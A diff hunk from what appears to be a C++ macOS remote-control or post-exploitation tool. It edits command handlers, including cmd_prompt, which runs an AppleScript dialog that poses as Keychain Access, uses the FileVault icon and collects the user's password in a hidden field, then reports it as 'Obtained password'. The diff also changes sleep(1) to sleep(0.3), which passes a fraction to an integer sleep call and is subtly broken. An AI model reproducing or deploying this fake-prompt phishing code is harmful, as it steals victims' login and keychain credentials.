@@ -233,15 +233,15 @@ void cmd_say(std::vector<std::string> commands)
 void cmd_getvol()
 {
     console_log_information("Current volume level: ");
-    sleep(1);
+    sleep(0.3);
     system("osascript -e 'output volume of (get volume settings)'");
 }
 
 void cmd_prompt()
 {
-    std::string payload = "osascript -e 'set popup to display dialog \"Keychain Access wants to use the login keychain\" & return & return & \"Please enter the keychain password\" & return default answer \"\" with icon file \"System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:FileVaultIcon.icns\" with title \"Authentication Needed\" with hidden answer'";
+    std::string payload = "set popup to display dialog \"Keychain Access wants to use the login keychain\" & return & return & \"Please enter the keychain password\" & return default answer \"\" with icon file \"System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:FileVaultIcon.icns\" with title \"Authentication Needed\" with hidden answer";
 
     console_log_information("Obtained password: ");
-    sleep(1);
+    sleep(0.3);
     system(("osascript -e '" + payload + "'").c_str());
 }
